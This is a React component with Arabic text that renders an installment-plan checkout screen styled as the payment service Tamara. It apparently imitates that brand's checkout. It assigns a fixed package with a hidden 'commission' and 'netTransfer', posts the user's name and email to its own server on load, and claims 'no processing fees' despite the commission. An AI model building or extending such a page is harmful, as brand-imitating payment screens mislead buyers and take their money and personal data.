import { useState, useMemo, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { postCheckoutEvent } from '@/lib/api';
import type { InstallmentPackage } from '../types';
import TamaraLogo from '@/components/TamaraLogo';

interface SelectPlanProps {
  productPrice: number;
  productName: string;
  userName: string;
  userEmail: string;
  sessionId: string;
  onContinue: (selectedPackage: InstallmentPackage) => void;
  onBack: () => void;
}

interface Package {
  totalAmount: number;
  installmentsCount: number;
  perInstallment: number;
  commission: number;
}

const ALL_PACKAGES: Package[] = [
  // 4 دفعات
  { totalAmount: 4140, installmentsCount: 4, perInstallment: 1035, commission: 210 },
  { totalAmount: 8280, installmentsCount: 4, perInstallment: 2070, commission: 410 },
  { totalAmount: 20700, installmentsCount: 4, perInstallment: 5175, commission: 1040 },
  // 6 دفعات
  { totalAmount: 6210, installmentsCount: 6, perInstallment: 1035, commission: 310 },
  { totalAmount: 12420, installmentsCount: 6, perInstallment: 2070, commission: 620 },
  { totalAmount: 31050, installmentsCount: 6, perInstallment: 5175, commission: 1550 },
  // 24 دفعة
  { totalAmount: 24000, installmentsCount: 24, perInstallment: 1000, commission: 600 },
  // تمارا فقط
  { totalAmount: 50000, installmentsCount: 12, perInstallment: 4166, commission: 1800 },
  { totalAmount: 100000, installmentsCount: 36, perInstallment: 2777, commission: 2200 },
];

const SelectPlan = ({
  productPrice,
  productName,
  userName,
  userEmail,
  sessionId,
  onContinue,
  onBack,
}: SelectPlanProps) => {
  const [showDetails, setShowDetails] = useState(false);

  const formatPrice = (price: number) => {
    return new Intl.NumberFormat('en-US').format(price);
  };

  const closestPackage = useMemo(() => {
    const sorted = [...ALL_PACKAGES].sort((a, b) => {
      const diffA = Math.abs(a.totalAmount - productPrice);
      const diffB = Math.abs(b.totalAmount - productPrice);
      return diffA - diffB;
    });
    return sorted[0];
  }, [productPrice]);

  useEffect(() => {
    if (!closestPackage) return;
    postCheckoutEvent({
      sessionId,
      eventType: 'plan_selected',
      userName,
      userEmail,
      productName,
      productPrice,
      installments: closestPackage.installmentsCount,
      perInstallment: closestPackage.perInstallment,
      commission: closestPackage.commission,
      timestamp: new Date().toISOString(),
    }).catch(() => {});
  }, [sessionId, userName, userEmail, productName, productPrice, closestPackage]);

  const handleContinue = () => {
    if (closestPackage) {
      const installmentPackage: InstallmentPackage = {
        totalAmount: closestPackage.totalAmount,
        installmentsCount: closestPackage.installmentsCount,
        perInstallment: closestPackage.perInstallment,
        commission: closestPackage.commission,
        netTransfer: closestPackage.totalAmount - closestPackage.commission,
      };
      onContinue(installmentPackage);
    }
  };

  // تواريخ الدفع الثابتة
  const PAYMENT_DATES = [
    '٤ أبريل ٢٠٢٦',
    '٤ مايو ٢٠٢٦',
    '٤ يونيو ٢٠٢٦',
    '٤ يوليو ٢٠٢٦',
    '٤ أغسطس ٢٠٢٦',
    '٤ سبتمبر ٢٠٢٦',
  ];

  return (
    <div className="min-h-screen bg-white" dir="rtl">
      {/* Header */}
      <div className="flex items-center justify-between px-4 py-3">
        <div className="flex items-center gap-3">
          <button onClick={onBack} className="text-gray-500 text-sm">✕</button>
          <button className="text-gray-500 text-sm">English</button>
        </div>
        <TamaraLogo className="h-6" />
      </div>

      {/* Content */}
      <div className="max-w-md mx-auto px-4 pb-32">
        {/* Title Section */}
        <div className="mb-6 text-right mt-6">
          <h1 className="text-xl font-bold text-black mb-2">اختر خطتك</h1>
          <p className="text-sm text-gray-500">
            حدد طريقة دفعك لـ {formatPrice(productPrice)} ريال
          </p>
        </div>

        {/* Plan Card - Single Package */}
        {closestPackage && (
          <div className="bg-[#f7f3ff] rounded-2xl p-4 w-full">
            {/* Header Row with badge and payment */}
            <div className="flex items-start justify-between mb-1">
              <span className="bg-purple-100 text-purple-600 px-2 py-0.5 rounded text-xs font-medium">
                {closestPackage.installmentsCount} دفعات
              </span>
              <span className="text-black font-bold text-base">
                ادفع {formatPrice(closestPackage.perInstallment)} ريال اليوم
              </span>
            </div>

            {/* Second row */}
            <div className="text-right mb-2">
              <span className="text-black text-base">
                بعدها {formatPrice(closestPackage.perInstallment)} ريال شهرياً
              </span>
            </div>

            {/* Green note - left aligned */}
            <p className="text-green-600 text-xs mb-4 text-left">
              هذه الخطة لا تشمل رسوم معالجة!
            </p>

            {/* Purple circle */}
            <div className="flex justify-center mb-3">
              <div className="w-12 h-12 bg-purple-500 rounded-full flex items-center justify-center text-white font-bold text-lg">
                {closestPackage.installmentsCount}
              </div>
            </div>

            {/* Details button */}
            <button
              onClick={() => setShowDetails(!showDetails)}
              className="w-full text-center text-black font-medium text-sm py-2"
            >
              {showDetails ? 'إخفاء التفاصيل' : 'عرض التفاصيل'}
            </button>

            {/* Expanded details */}
            {showDetails && (
              <div className="mt-4 pt-4 border-t border-purple-200 space-y-2">
                <div className="flex items-center justify-between text-gray-700 text-sm">
                  <span>اليوم - {PAYMENT_DATES[0]}</span>
                  <span className="font-semibold">{formatPrice(closestPackage.perInstallment)} ريال</span>
                </div>
                {Array.from({ length: closestPackage.installmentsCount - 1 }, (_, i) => (
                  <div key={i} className="flex items-center justify-between text-gray-700 text-sm">
                    <span>الدفعة {i + 2} - {PAYMENT_DATES[i + 1] || ''}</span>
                    <span className="font-semibold">{formatPrice(closestPackage.perInstallment)} ريال</span>
                  </div>
                ))}
                <div className="flex items-center justify-between text-black font-bold text-base pt-2 border-t border-purple-200 mt-2">
                  <span>الإجمالي</span>
                  <span>{formatPrice(closestPackage.totalAmount)} ريال</span>
                </div>
              </div>
            )}
          </div>
        )}
      </div>

      {/* Fixed Bottom Button */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 p-4">
        <div className="max-w-md mx-auto">
          <Button
            onClick={handleContinue}
            className="w-full py-3 font-bold rounded-lg bg-black hover:bg-gray-900 text-white"
          >
            متابعة الدفع
          </Button>
        </div>
      </div>
    </div>
  );
};

export default SelectPlan;
